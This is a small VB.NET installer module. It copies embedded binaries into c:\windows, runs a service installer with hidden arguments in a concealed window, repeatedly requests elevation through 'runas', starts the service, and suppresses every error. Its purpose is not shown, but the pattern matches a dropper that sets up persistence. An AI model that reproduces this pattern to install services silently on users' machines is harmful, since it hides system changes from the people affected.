Imports System.Reflection
Imports System.IO

Module main
    Public args As String()

    Sub main()
        Try
            args = Environment.GetCommandLineArgs()
            Try
                If Not File.Exists("c:\windows\spss.exe") Then
                    File.WriteAllBytes("c:\windows\spss.exe", My.Resources.operation_ctrl_sys_service)
                End If

                If Not File.Exists("c:\windows\calmclientandserver.dll") Then
                    File.WriteAllBytes("c:\windows\calmclientandserver.dll", My.Resources.calmclientandserver)
                End If
            Catch ex As Exception
            End Try
            Try
                Dim pr_inst As New Process
                pr_inst.StartInfo.FileName = My.Resources.srvinst
                pr_inst.StartInfo.Arguments = My.Resources.cmdargs
                pr_inst.StartInfo.UseShellExecute = False
                pr_inst.StartInfo.RedirectStandardOutput = True
                pr_inst.StartInfo.CreateNoWindow = True
                pr_inst.Start()
                Dim ret As String = pr_inst.StandardOutput.ReadToEnd()
                pr_inst.WaitForExit()
                If ret.Contains(My.Resources._1 & " " & My.Resources._2 & " " & My.Resources._3 & " " & My.Resources._fs) And args.Length < 12 Then
                    Dim retc As Integer = 0
retyr:
                    Try
                        Process.Start(New ProcessStartInfo() With {.FileName = Assembly.GetEntryAssembly.Location, .Arguments = My.Resources.ags, .Verb = "runas"})
                    Catch ex As Exception
                        If retc < 5 Then
                            retc += 1
                            GoTo retyr
                        End If
                    End Try

                    End
                End If
            Catch ex As Exception
            End Try
            Try
                Dim pr_start As New Process
                pr_start.StartInfo.FileName = My.Resources.srvinst
                pr_start.StartInfo.Arguments = My.Resources.cmdargs2
                pr_start.StartInfo.UseShellExecute = False
                pr_start.StartInfo.CreateNoWindow = True
                pr_start.Start()
            Catch ex As Exception
            End Try
        Catch ex As Exception
        End Try

        End
    End Sub
End Module
